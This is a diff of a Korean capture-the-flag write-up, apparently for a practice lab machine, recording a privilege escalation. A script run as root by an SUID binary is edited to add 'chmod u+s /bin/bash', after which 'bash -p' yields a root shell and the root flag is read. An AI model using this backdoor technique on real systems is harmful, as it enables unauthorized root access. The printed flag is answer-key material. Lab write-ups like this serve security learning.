@@ -2748,12 +2748,52 @@ PID TTY TIME CMD
 31067 pts/0 00:00:00 bash
 
 ```bash
-# 다시 실행하자
-get_root_shell() {
-    /bin/bash
-    # 비밀번호도 새로 설정
-    echo "think:1234" | chpasswd
-}
+# 한 줄 추가
+chmod u+s /bin/bash
 
-get_root_shell
+list_containers() {
+if [ -z "$(docker ps -aq)" ]; then
+docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
+fi
+echo "List of Docker containers:"
+docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
+echo ""
+}
 ```
+
+# /usr/sbin/run_container -> SUID 바이너리 실행 -> 루트로 실행 됨
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/7235c828-6f0f-4e81-b856-cb2006a1bb71/image.png)
+
+Enter the ID of the container or leave blank to create a new one: ^C
+think@ip-10-201-17-89:/opt$ bash -p
+think@ip-10-201-17-89:/opt$ whoami
+think
+
+think@ip-10-201-17-89:/opt$ sudo ./run_container.sh
+[sudo] password for think:
+Sorry, try again.
+[sudo] password for think:
+sudo: 1 incorrect password attempt
+
+# 바이너리로 실행하여 성공 -> rooting
+
+think@ip-10-201-17-89:/opt$ /usr/sbin/run_container
+List of Docker containers:
+ID: 41c976e507f8 | Name: jovial_hertz | Status: Up About an hour
+
+Enter the ID of the container or leave blank to create a new one: ^C
+think@ip-10-201-17-89:/opt$ whoami
+think
+think@ip-10-201-17-89:/opt$ bash -p
+bash-5.0# whoami
+root
+bash-5.0#
+
+# flag2
+
+find / -name "\*.txt" 2>/dev/null
+cd /root
+cat root.txt
+
+3a4225cc9e85709adda6ef55d6a4f2ca
